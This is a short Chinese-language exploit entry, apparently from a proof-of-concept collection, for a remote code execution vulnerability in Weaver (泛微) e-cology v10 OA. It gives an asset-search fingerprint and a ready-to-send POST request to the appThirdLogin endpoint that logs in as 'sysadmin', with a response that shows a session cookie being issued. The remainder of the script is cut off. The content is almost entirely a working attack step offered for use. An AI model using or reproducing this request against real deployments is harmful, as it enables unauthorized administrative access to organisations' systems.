# 泛微e-cologyv10远程代码执行漏洞

- **系统**：泛微OA　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="泛微-OA（e-cology）"`
- **请求**：`POST /papi/passport/rest/appThirdLogin HTTP/1.1`

**请求体 / payload**
```
**步骤一**
Host:
Content-Type: application/x-www-form-urlencoded
Content-Length: 51
username=sysadmin&service=1&ip=1&loginType=third
----
HTTP/1.1 200 OK
Server: ******
Content-Type: application/json;charset=UTF-8
Date: Tue, 20 Aug 2024 08:39:09 GMT
traceId: f377fe57-0a32-42e8-80f8-91178393ca96
Set-Cookie: ETEAMS_TGC=TGT521-0L9GdBeMWxijLGMwbnRPEATrA9cHd9pvbaQ4sjcKA9EIgY5cBx; Path=/
Access-Control-Allow-Headers: X-CSRFToken,Authorization,Content-Type,Accept,Origin,User-Agent,DNT,Cache-Control,X-Mx-ReqToken,X-Requested-With,X-File-Name,i18n,token,appkey,userName,password,sw8,eteamsid,traceid,langTy…（脚本共 2585 字，完整版见原文）
```
- **预期**：200　|　—